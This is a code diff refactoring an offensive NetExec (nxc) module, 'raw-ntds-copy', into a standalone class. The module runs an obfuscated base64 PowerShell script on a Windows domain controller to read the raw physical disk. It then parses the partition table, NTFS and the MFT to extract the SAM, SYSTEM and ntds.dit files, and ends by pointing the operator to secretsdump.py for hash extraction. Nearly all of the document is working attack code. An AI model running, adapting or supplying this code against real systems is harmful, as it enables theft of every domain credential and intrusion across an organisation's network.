@@ -1,5 +1,5 @@
 # raw-ntds-copy module for nxc
-# Author of the module : Github:@0xb11a1, X:@0xcc00
+# Author of the module : Bilal Github:@0xb11a1, X:@0xcc00
 
 import base64
 from os import makedirs
@@ -13,12 +13,7 @@ import gzip
 from io import BytesIO
 
 
-class NXCModule:
-    name = "raw-ntds-copy"
-    description = "Extracting the ntds.dit, SAM, and SYSTEM files from DC by accessing the raw hard drive."
-    supported_protocols = ["smb"]
-    opsec_safe = True  # could be flagged
-    multiple_hosts = False
+class RawNTDSCopy:
     files_full_location_to_extract = [
         "Windows/System32/config/SYSTEM",
         "Windows/System32/config/SAM",
@@ -31,8 +26,9 @@ class NXCModule:
     extracted_files_location_local = {"SAM": "", "SYSTEM": "", "ntds.dit": ""}
     NTFS_LOCATION = 0
     MFT_LOCATION = 0
-    context = None
+    logger = None
     connection = None
+    execute = None
     GPT_HEADER_OFFSET = 512
     GPT_HEADER_SIZE = 92
     PARTITION_ENTRY_SIZE = 128
@@ -81,8 +77,8 @@ class NXCModule:
         # scary base64 powershell code :)
         # This to read the PhysicalDrive0 file
         Get_data_script = f"""powershell.exe -c "$base64Cmd = 'IABBAGQAZAAtAFQAeQBwAGUAIAAtAFQAeQBwAGUARABlAGYAaQBuAGkAdABpAG8AbgAgAEAAIgAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwA7AAoAdQBzAGkAbgBnACAATQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBTAGEAZgBlAEgAYQBuAGQAbABlAHMAOwAKAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABDAE4AYQB0AGkAdgBlAE0AZQB0AGgAbwBkAHMACgB7AAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAGMAbwBuAHMAdAAgAHUAaQBuAHQAIABHAEUATgBFAFIASQBDAF8AUgBFAEEARAAgAD0AIAAwAHgAOAAwADAAMAAwADAAMAAwADsACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAYwBvAG4AcwB0ACAAdQBpAG4AdAAgAE8AUABFAE4AXwBFAFgASQBTAFQASQBOAEcAIAA9ACAAMwA7AAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAGMAbwBuAHMAdAAgAHUAaQBuAHQAIABGAEkATABFAF8AUwBIAEEAUgBFAF8AUgBFAEEARAAgAD0AIAAwAHgAMAAwADAAMAAwADAAMAAxADsACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAYwBvAG4AcwB0ACAAdQBpAG4AdAAgAEYASQBMAEUAXwBTAEgAQQBSAEUAXwBXAFIASQBUAEUAIAA9ACAAMAB4ADAAMAAwADAAMAAwADAAMgA7AAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAGMAbwBuAHMAdAAgAHUAaQBuAHQAIABGAEkATABFAF8AUwBIAEEAUgBFAF8ARABFAEwARQBUAEUAIAA9ACAAMAB4ADAAMAAwADAAMAAwADAANAA7AAoACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByACAAPQAgAHQAcgB1AGUALAAgAEMAaABhAHIAUwBlAHQAIAA9ACAAQwBoAGEAcgBTAGUAdAAuAFUAbgBpAGMAbwBkAGUAKQBdAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABTAGEAZgBlAEYAaQBsAGUASABhAG4AZABsAGUAIABDAHIAZQBhAHQAZQBGAGkAbABlACgACgAgACAAIAAgACAAIAAgACAAcwB0AHIAaQBuAGcAIABsAHAARgBpAGwAZQBOAGEAbQBlACwAIAAKACAAIAAgACAAIAAgACAAIAB1AGkAbgB0ACAAZAB3AEQAZQBzAGkAcgBlAGQAQQBjAGMAZQBzAHMALAAgAAoAIAAgACAAIAAgACAAIAAgAHUAaQBuAHQAIABkAHcAUwBoAGEAcgBlAE0AbwBkAGUALAAgAAoAIAAgACAAIAAgACAAIAAgAEkAbgB0AFAAdAByACAAbABwAFMAZQBjAHUAcgBpAHQAeQBBAHQAdAByAGkAYgB1AHQAZQBzACwAIAAKACAAIAAgACAAIAAgACAAIAB1AGkAbgB0ACAAZAB3AEMAcgBlAGEAdABpAG8AbgBEAGkAcwBwAG8AcwBpAHQAaQBvAG4ALAAgAAoAIAAgACAAIAAgACAAIAAgAHUAaQBuAHQAIABkAHcARgBsAGEAZwBzAEEAbgBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAAoAIAAgACAAIAAgACAAIAAgAEkAbgB0AFAAdAByACAAaABUAGUAbQBwAGwAYQB0AGUARgBpAGwAZQAKACAAIAAgACAAKQA7AAoACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByACAAPQAgAHQAcgB1AGUAKQBdAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAUgBlAGEAZABGAGkAbABlACgACgAgACAAIAAgACAAIAAgACAAUwBhAGYAZQBGAGkAbABlAEgAYQBuAGQAbABlACAAaABGAGkAbABlACwAIAAKACAAIAAgACAAIAAgACAAIABiAHkAdABlAFsAXQAgAGwAcABCAHUAZgBmAGUAcgAsACAACgAgACAAIAAgACAAIAAgACAAdQBpAG4AdAAgAG4ATgB1AG0AYgBlAHIATwBmAEIAeQB0AGUAcwBUAG8AUgBlAGEAZAAsACAACgAgACAAIAAgACAAIAAgACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAE4AdQBtAGIAZQByAE8AZgBCAHkAdABlAHMAUgBlAGEAZAAsACAACgAgACAAIAAgACAAIAAgACAASQBuAHQAUAB0AHIAIABsAHAATwB2AGUAcgBsAGEAcABwAGUAZAAKACAAIAAgACAAKQA7AAoACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByACAAPQAgAHQAcgB1AGUAKQBdAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAUwBlAHQARgBpAGwAZQBQAG8AaQBuAHQAZQByAEUAeAAoAAoAIAAgACAAIAAgACAAIAAgAFMAYQBmAGUARgBpAGwAZQBIAGEAbgBkAGwAZQAgAGgARgBpAGwAZQAsACAACgAgACAAIAAgACAAIAAgACAAbABvAG4AZwAgAGwARABpAHMAdABhAG4AYwBlAFQAbwBNAG8AdgBlACwAIAAKACAAIAAgACAAIAAgACAAIABvAHUAdAAgAGwAbwBuAGcAIABsAHAATgBlAHcARgBpAGwAZQBQAG8AaQBuAHQAZQByACwAIAAKACAAIAAgACAAIAAgACAAIAB1AGkAbgB0ACAAZAB3AE0AbwB2AGUATQBlAHQAaABvAGQACgAgACAAIAAgACkAOwAKAH0ACgAKAHAAdQBiAGwAaQBjACAAZQBuAHUAbQAgAEUATQBvAHYAZQBNAGUAdABoAG8AZAAgADoAIAB1AGkAbgB0AAoAewAKACAAIAAgACAAQgBlAGcAaQBuACAAPQAgADAALAAKACAAIAAgACAAQwB1AHIAcgBlAG4AdAAgAD0AIAAxACwACgAgACAAIAAgAEUAbgBkACAAPQAgADIACgB9AAoAIgBAAAoARgB1AG4AYwB0AGkAbwBuACAAcgBlAGEAZABfAGQAaQBzAGsAewAKAAoACgAkAG8AZgBmAHMAZQB0ACAAPQAgAFsAbABvAG4AZwBdACQAYQByAGcAcwBbADAAXQAKACQAcwBpAHoAZQAgAD0AIABbAGkAbgB0AF0AJABhAHIAZwBzAFsAMQBdAAoAdAByAHkAIAB7AAoAIAAgACAAIAAkAGgAYQBuAGQAbABlACAAPQAgAFsAQwBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAF0AOgA6AEMAcgBlAGEAdABlAEYAaQBsAGUAKAAiAFwAXAAuAFwAUABIAFkAUwBJAEMAQQBMAEQAUgBJAFYARQAwACIALAAgAAoAIAAgACAAIAAgACAAIAAgAFsAQwBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAF0AOgA6AEcARQBOAEUAUgBJAEMAXwBSAEUAQQBEACwAIAAKACAAIAAgACAAIAAgACAAIABbAEMATgBhAHQAaQB2AGUATQBlAHQAaABvAGQAcwBdADoAOgBGAEkATABFAF8AUwBIAEEAUgBFAF8AUgBFAEEARAAgAC0AYgBvAHIAIABbAEMATgBhAHQAaQB2AGUATQBlAHQAaABvAGQAcwBdADoAOgBGAEkATABFAF8AUwBIAEEAUgBFAF8AVwBSAEkAVABFACAALQBiAG8AcgAgAFsAQwBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAF0AOgA6AEYASQBMAEUAXwBTAEgAQQBSAEUAXwBEAEUATABFAFQARQAsACAACgAgACAAIAAgACAAIAAgACAAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACwAIABbAEMATgBhAHQAaQB2AGUATQBlAHQAaABvAGQAcwBdADoAOgBPAFAARQBOAF8ARQBYAEkAUwBUAEkATgBHACwAIAAwACwAIABbAEkAbgB0AFAAdAByAF0AOgA6AFoAZQByAG8AKQAKAAoAIAAgACAAIABpAGYAIAAoACQAaABhAG4AZABsAGUALgBJAHMASQBuAHYAYQBsAGkAZAApACAAewAKACAAIAAgACAAIAAgACAAIAB0AGgAcgBvAHcAIAAiAEYAYQBpAGwAZQBkACAAdABvACAAYwByAGUAYQB0AGUAIABmAGkAbABlACAAaABhAG4AZABsAGUAIgAKACAAIAAgACAAfQAKAAoAIAAgACAAIAAkAG0AbwB2AGUAVABvAEgAaQBnAGgAIAA9ACAAMAAKACAAIAAgACAAJABzAHUAYwBjAGUAcwBzACAAPQAgAFsAQwBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAF0AOgA6AFMAZQB0AEYAaQBsAGUAUABvAGkAbgB0AGUAcgBFAHgAKAAkAGgAYQBuAGQAbABlACwAIAAkAG8AZgBmAHMAZQB0ACwAIABbAHIAZQBmAF0AJABtAG8AdgBlAFQAbwBIAGkAZwBoACwAIABbAEUATQBvAHYAZQBNAGUAdABoAG8AZABdADoAOgBCAGUAZwBpAG4AKQAKACAAIAAgACAAaQBmACAAKAAtAG4AbwB0ACAAJABzAHUAYwBjAGUAcwBzACkAIAB7AAoAIAAgACAAIAAgACAAIAAgAHQAaAByAG8AdwAgACIARgBhAGkAbABlAGQAIAB0AG8AIABzAGUAdAAgAGYAaQBsAGUAIABwAG8AaQBuAHQAZQByACIACgAgACAAIAAgAH0ACgAKACAAIAAgACAAJABiAHUAZgBmAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAYgB5AHQAZQBbAF0AIAAkAHMAaQB6AGUACgAgACAAIAAgACQAYgB5AHQAZQBzAFIAZQBhAGQAIAA9ACAAMAAKACAAIAAgACAAJABzAHUAYwBjAGUAcwBzACAAPQAgAFsAQwBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAF0AOgA6AFIAZQBhAGQARgBpAGwAZQAoACQAaABhAG4AZABsAGUALAAgACQAYgB1AGYAZgBlAHIALAAgACQAcwBpAHoAZQAsACAAWwByAGUAZgBdACQAYgB5AHQAZQBzAFIAZQBhAGQALAAgAFsASQBuAHQAUAB0AHIAXQA6ADoAWgBlAHIAbwApAAoACgAgACAAIAAgAGkAZgAgACgALQBuAG8AdAAgACQAcwB1AGMAYwBlAHMAcwApACAAewAKACAAIAAgACAAIAAgACAAIAB0AGgAcgBvAHcAIAAiAEYAYQBpAGwAZQBkACAAdABvACAAcgBlAGEAZAAgAGYAaQBsAGUAIgAKACAAIAAgACAAfQAKAAoAIAAgACAAIAAkAG0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAAoACgAgACAAIAAgAAoAIAAgACAAIAAkAGcAegBpAHAAUwB0AHIAZQBhAG0AIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQAbQBlAG0AbwByAHkAUwB0AHIAZQBhAG0ALAAgAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBDAG8AbQBwAHIAZQBzAHMAKQAKAAoAIAAgACAAIAAkAGcAegBpAHAAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAGIAdQBmAGYAZQByACwAIAAwACwAIAAkAGIAdQBmAGYAZQByAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAJABnAHoAaQBwAFMAdAByAGUAYQBtAC4AQwBsAG8AcwBlACgAKQAKACAAIAAgACAACgAgACAAIAAgACQAYwBvAG0AcAByAGUAcwBzAGUAZABCAHkAdABlAHMAIAA9ACAAJABtAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQAuAFQAbwBBAHIAcgBhAHkAKAApAAoAIAAgACAAIAAKACAAIAAgACAAJABjAG8AbQBwAHIAZQBzAHMAZQBkAEIAYQBzAGUANgA0ACAAPQAgAFsAQwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGMAbwBtAHAAcgBlAHMAcwBlAGQAQgB5AHQAZQBzACkACgAKACAAIAAgACAAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAkAGMAbwBtAHAAcgBlAHMAcwBlAGQAQgBhAHMAZQA2ADQACgAKACAAIAAgACAACgAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIABXAHIAaQB0AGUALQBFAHIAcgBvAHIAIAAiAEEAbgAgAGUAcgByAG8AcgAgAG8AYwBjAHUAcgByAGUAZAA6ACAAJABfACIACgB9AAoACgBmAGkAbgBhAGwAbAB5ACAAewAKACAAIAAgACAAaQBmACAAKAAkAGgAYQBuAGQAbABlACAALQBhAG4AZAAgACEAJABoAGEAbgBkAGwAZQAuAEkAcwBJAG4AdgBhAGwAaQBkACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAaABhAG4AZABsAGUALgBDAGwAbwBzAGUAKAApAAoAIAAgACAAIAB9AAoAfQAKAH0ACgA=';$decodedCmd = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($base64Cmd)) + '; read_disk {offset} {fixed_size}'; Invoke-Expression $decodedCmd" """
-        data_output = self.connection.execute(Get_data_script, True)
-        self.context.log.debug(f"{offset=},{size=},{fixed_size=},{data_output=}")
+        data_output = self.execute(Get_data_script, True)
+        self.logger.debug(f"{offset=},{size=},{fixed_size=},{data_output=}")
         compressed_bytes = base64.b64decode(data_output)[:size]
         compressed_stream = BytesIO(compressed_bytes)
 
@@ -91,24 +87,26 @@ class NXCModule:
 
         return decompressed_bytes[:size]
 
-    def on_admin_login(self, context, connection):
+    def __init__(self, logger, connection, execute, host):
+        self.host = host
         self.connection = connection
-        self.context = context
+        self.logger = logger
+        self.execute = execute
         self.main()
 
     def main(self):
         first_section = self.read_from_disk(0, 1024)
         if len(first_section) == 0:
-            self.context.log.fail(
+            self.logger.fail(
                 "Unable to read the Disk, try changing the --exec-method flag"
             )
         if first_section[512 : 512 + 8] == b"EFI PART":
-            self.context.log.display("Disk is formated using GPT")
+            self.logger.display("Disk is formated using GPT")
             NTFS_LOCATION = self.analyze_gpt("\\\\.\\PhysicalDrive0")
             if NTFS_LOCATION == -1:
-                self.context.log.fail("[-] NTFS Basic data partition not found ")
+                self.logger.fail("[-] NTFS Basic data partition not found ")
         else:
-            self.context.log.display("Disk is formated using MBR")
+            self.logger.display("Disk is formated using MBR")
             max_parition_size = 0
             NTFS_LOCATION = (
                 self.bytes_to_int_unsigned(first_section[0x1C6:0x1CA])
@@ -122,7 +120,7 @@ class NXCModule:
                         + (partition_indx * 0x10)
                     ]
                 )
-                # self.context.log.highlight(curr_partition_size)
+                # self.logger.highlight(curr_partition_size)
                 if curr_partition_size > max_parition_size:
                     max_parition_size = curr_partition_size
                     NTFS_LOCATION = (
@@ -136,28 +134,28 @@ class NXCModule:
                         * self.SECTOR_SIZE
                     )
 
-        self.context.log.display(f"NTFS Location {hex(NTFS_LOCATION)}")
+        self.logger.display(f"NTFS Location {hex(NTFS_LOCATION)}")
         self.NTFS_LOCATION = NTFS_LOCATION
         NTFS_header = self.read_from_disk(NTFS_LOCATION, 1024)
 
         self.analyze_NTFS(NTFS_header)
-        self.context.log.display(
+        self.logger.display(
             f"MFT location {hex(self.MFT_LOCATION)}, Cluster_size {self.CLUSTER_SIZE}"
         )
 
         MFT_file_header_data = self.read_from_disk(self.MFT_LOCATION, 1024)
         MFT_file_header = self.analyze_MFT_header(MFT_file_header_data)
 
-        self.context.log.highlight(
+        self.logger.highlight(
             "[+] This may take a while, perfect time to grab a coffee! c[_] "
         )
 
         self.read_MFT(MFT_file_header)
 
         if self.number_of_file_to_extract != 0:
-            self.context.log.fail("Unable to find all needed files")
-        self.context.log.display("Done, Have fun with the hashes")
-        self.context.log.display(
+            self.logger.fail("Unable to find all needed files")
+        self.logger.display("Done, Have fun with the hashes")
+        self.logger.display(
             f"Next : secretsdump.py LOCAL -sam {self.extracted_files_location_local['SAM']} -system {self.extracted_files_location_local['SYSTEM']} -ntds {self.extracted_files_location_local['ntds.dit']}"
         )
 
@@ -176,13 +174,12 @@ class NXCModule:
 
     def read_MFT(self, MFT_file_header: MFA_sector_properties):
         # resize dataRun into a small chunks
-        host = self.connection.host
-        filename_on_disk = f"{host}_MFT_{self.RANDOM_RUN_NUM}.bin"
+        filename_on_disk = f"{self.host}_MFT_{self.RANDOM_RUN_NUM}.bin"
         export_path = join(TMP_PATH, "raw_ntds_dump")
         path = abspath(join(export_path, filename_on_disk))
         makedirs(export_path, exist_ok=True)
         self.MFT_local_path = path
-        self.context.log.display(
+        self.logger.display(
             f"Analyzing & Extracting {MFT_file_header.filename} {MFT_file_header.size/(1024**2)}MB"
         )
         for i in MFT_file_header.dataRun:
@@ -193,12 +190,12 @@ class NXCModule:
             while size > 0:
                 if size < chunk_size:
                     chunk_size = size
-                self.context.log.debug(f"{hex(curr_cluster_loc)=}")
+                self.logger.debug(f"{hex(curr_cluster_loc)=}")
                 curr_data = self.read_from_disk(curr_cluster_loc, chunk_size)
                 curr_cluster_loc += chunk_size
                 size -= chunk_size
-                self.context.log.debug(f"{len(curr_data)=} ")
-                self.context.log.debug(f"{size=}")
+                self.logger.debug(f"{len(curr_data)=} ")
+                self.logger.debug(f"{size=}")
 
                 with open(path, "ab") as f:
                     f.write(curr_data)
@@ -212,7 +209,7 @@ class NXCModule:
     def search_for_the_files(self, curr_data):
 
         MFT_record_indx = 0
-        # self.context.log.display("Reading next MFT chunk")
+        # self.logger.display("Reading next MFT chunk")
         for curr_record_indx in range(len(curr_data) // 1024):
             curr_sector = curr_data[
                 curr_record_indx * 1024 : curr_record_indx * 1024 + 1024
@@ -225,11 +222,11 @@ class NXCModule:
                 ):
                     continue
             except Exception as e:
-                self.context.log.debug(e)
+                self.logger.debug(e)
                 continue
 
             if curr_MFA_sector_properties.filename in self.files_to_extract:
-                # self.context.log.display(curr_MFA_sector_properties.filename)
+                # self.logger.display(curr_MFA_sector_properties.filename)
                 wanted_file_indx = self.files_to_extract.index(
                     curr_MFA_sector_properties.filename
                 )
@@ -244,14 +241,14 @@ class NXCModule:
                 curr_full_path = self.get_full_path(
                     curr_MFA_sector_properties.parent_record_number
                 )
-                # self.context.log.display(curr_full_path)
-                # self.context.log.display(wanted_file_location)
+                # self.logger.display(curr_full_path)
+                # self.logger.display(wanted_file_location)
 
                 if (
                     wanted_file_location.lower()
                     == "/".join(curr_full_path[::-1]).lower()
                 ):
-                    self.context.log.success(
+                    self.logger.success(
                         f"Found {self.files_full_location_to_extract[wanted_file_indx]} {curr_MFA_sector_properties.size/(1024**2)}MB .. extracting "
                     )
                     curr_file_local_location = self.extractDataRunBytes(
@@ -300,27 +297,26 @@ class NXCModule:
         filename,
         offset=0,
     ):
-        host = self.connection.host
-        filename_on_disk = f"{host}_{filename}_{self.RANDOM_RUN_NUM}.bin"
+        filename_on_disk = f"{self.host}_{filename}_{self.RANDOM_RUN_NUM}.bin"
         export_path = join(TMP_PATH, "raw_ntds_dump")
         path = abspath(join(export_path, filename_on_disk))
         makedirs(export_path, exist_ok=True)
-        self.context.log.display(f"Extracting {filename} to {path}")
+        self.logger.display(f"Extracting {filename} to {path}")
         for i in lst:
             cluster_loc = i[0] * self.CLUSTER_SIZE
             size = i[1] * self.CLUSTER_SIZE
             curr_cluster_loc = cluster_loc + offset
             chunk_size = self.CHUNK_SIZE
             while size > 0:
-                self.context.log.debug("REading data ... ")
+                self.logger.debug("REading data ... ")
                 if size < chunk_size:
                     chunk_size = size
-                self.context.log.debug(f"{hex(curr_cluster_loc)=}")
+                self.logger.debug(f"{hex(curr_cluster_loc)=}")
                 curr_data = self.read_from_disk(curr_cluster_loc, chunk_size)
                 curr_cluster_loc += chunk_size
                 size -= chunk_size
-                self.context.log.debug(f"{len(curr_data)=} ")
-                self.context.log.debug(f"{size=}")
+                self.logger.debug(f"{len(curr_data)=} ")
+                self.logger.debug(f"{size=}")
 
                 with open(path, "ab") as f:
                     f.write(curr_data)
@@ -334,15 +330,15 @@ class NXCModule:
             curr_cluster_loc = cluster_loc + self.NTFS_LOCATION
             chunk_size = self.CHUNK_SIZE
             while size > 0:
-                self.context.log.debug("REading data ... ")
+                self.logger.debug("REading data ... ")
                 if size < chunk_size:
                     chunk_size = size
-                self.context.log.debug(f"{hex(curr_cluster_loc)=}")
+                self.logger.debug(f"{hex(curr_cluster_loc)=}")
                 curr_data = self.read_from_disk(curr_cluster_loc, chunk_size)
                 curr_cluster_loc += chunk_size
                 size -= chunk_size
-                self.context.log.debug(f"{len(curr_data)=} ")
-                self.context.log.debug(f"{size=}")
+                self.logger.debug(f"{len(curr_data)=} ")
+                self.logger.debug(f"{size=}")
 
     def hexbytes(self, xs, group_size=1, byte_separator=" ", group_separator=" "):
         def ordc(c):
@@ -454,15 +450,15 @@ class NXCModule:
             return struct.unpack("<Q", lst)[0]
 
     def decode_dataRun(self, dataRun):
-        self.context.log.debug("datarun:")
+        self.logger.debug("datarun:")
 
         curr_datarun_indx = 0
         prev_datarun_loc = 0
         total_size = 0
         result = list()
         while dataRun[curr_datarun_indx] != 0:
-            self.context.log.debug(f"----------------- DataRun {curr_datarun_indx}")
-            self.context.log.debug(f"{hex(dataRun[curr_datarun_indx])=}")
+            self.logger.debug(f"----------------- DataRun {curr_datarun_indx}")
+            self.logger.debug(f"{hex(dataRun[curr_datarun_indx])=}")
             dataRun_startingCluster_nBytes = dataRun[curr_datarun_indx] & 0b00001111
             dataRun_len_nBytes = (dataRun[curr_datarun_indx] & 0b11110000) >> 4
             curr_datarun_indx += 1
@@ -478,17 +474,17 @@ class NXCModule:
                 + dataRun_len_nBytes
             ]
 
-            self.context.log.debug(f"{binascii.hexlify(datarun_startingCluster)=} ")
-            self.context.log.debug(
+            self.logger.debug(f"{binascii.hexlify(datarun_startingCluster)=} ")
+            self.logger.debug(
                 f"{int.from_bytes(datarun_startingCluster, byteorder='little', signed=True)}"
             )
-            self.context.log.debug(f"{prev_datarun_loc=}")
+            self.logger.debug(f"{prev_datarun_loc=}")
             datarun_cluster_loc = (
                 int.from_bytes(datarun_startingCluster, byteorder="little", signed=True)
                 + prev_datarun_loc
             )
-            self.context.log.debug(f"{hex((datarun_cluster_loc*4096))=}")
-            self.context.log.debug(f"{hex(dataRun_len)=}")
+            self.logger.debug(f"{hex((datarun_cluster_loc*4096))=}")
+            self.logger.debug(f"{hex(dataRun_len)=}")
             total_size += dataRun_len
             result.append([datarun_cluster_loc, dataRun_len])
 
@@ -497,16 +493,16 @@ class NXCModule:
             )
             prev_datarun_loc = datarun_cluster_loc
 
-        self.context.log.debug(
+        self.logger.debug(
             f"total size: {total_size*4096}"
         )  # size is the cluster count, * cluster length
-        self.context.log.debug("---- Finished datarun analysis")
+        self.logger.debug("---- Finished datarun analysis")
         return result, total_size * self.CLUSTER_SIZE
 
     def parse_MFT_header(self, curr_sector):
         curr_index = 0
         parsed_header = dict()
-        self.context.log.debug(self.hexdump(curr_sector))
+        self.logger.debug(self.hexdump(curr_sector))
         while True:
             curr_header = self.bytes_to_int_unsigned(
                 curr_sector[curr_index : curr_index + 4]
@@ -528,14 +524,14 @@ class NXCModule:
     def analyze_MFT_header(self, curr_sector):
         curr_MFA_sector = self.MFA_sector_properties()
 
-        self.context.log.debug(curr_sector[:4])
+        self.logger.debug(curr_sector[:4])
 
         if curr_sector[:4] != b"FILE":
-            self.context.log.debug("Not a valid header")
+            self.logger.debug("Not a valid header")
             return None
 
         Offset_to_the_first_attribute = self.bytes_to_int_unsigned(curr_sector[20:22])
-        self.context.log.debug(f"{hex(Offset_to_the_first_attribute)=}")
+        self.logger.debug(f"{hex(Offset_to_the_first_attribute)=}")
 
         parsed_header = self.parse_MFT_header(
             curr_sector[Offset_to_the_first_attribute:]
@@ -552,9 +548,9 @@ class NXCModule:
             curr_MFA_sector.filename = parsed_header["$FILE_NAME"][
                 0x58 + 2 : 0x58 + 2 + (filename_lenght * 2)
             ].decode("utf-16")
-            self.context.log.debug(f"{curr_MFA_sector.filename=}")
+            self.logger.debug(f"{curr_MFA_sector.filename=}")
 
-        self.context.log.debug("Attribute 80")
+        self.logger.debug("Attribute 80")
 
         if "$DATA" in parsed_header.keys():
             dataRun_offset = self.bytes_to_int_signed(
@@ -564,7 +560,7 @@ class NXCModule:
             dataRun = parsed_header["$DATA"][dataRun_offset:]
             curr_MFA_sector.dataRun, curr_MFA_sector.size = self.decode_dataRun(dataRun)
 
-        self.context.log.debug(curr_MFA_sector)
+        self.logger.debug(curr_MFA_sector)
         return curr_MFA_sector
 
     def analyze_gpt(self, disk_path):
@@ -576,18 +572,18 @@ class NXCModule:
             disk_path, partition_entry_lba, num_partition_entries, partition_entry_size
         )
 
-        self.context.log.debug(f"Found {len(partition_entries)} partition entries.")
+        self.logger.debug(f"Found {len(partition_entries)} partition entries.")
 
         NTFS_partition_location = -1
         for index, partition_entry in enumerate(partition_entries):
-            self.context.log.debug(f"\nPartition {index + 1}:")
+            self.logger.debug(f"\nPartition {index + 1}:")
             first_lba, partition_name = self.parse_partition_entry(partition_entry)
             if first_lba > 0:
-                self.context.log.debug(f"First Physical Address (LBA): {first_lba}")
+                self.logger.debug(f"First Physical Address (LBA): {first_lba}")
             else:
                 break
 
-            self.context.log.debug(f"{partition_name=}")
+            self.logger.debug(f"{partition_name=}")
             if partition_name == "Basic data partition":
                 NTFS_partition_location = first_lba * 512
         return NTFS_partition_location
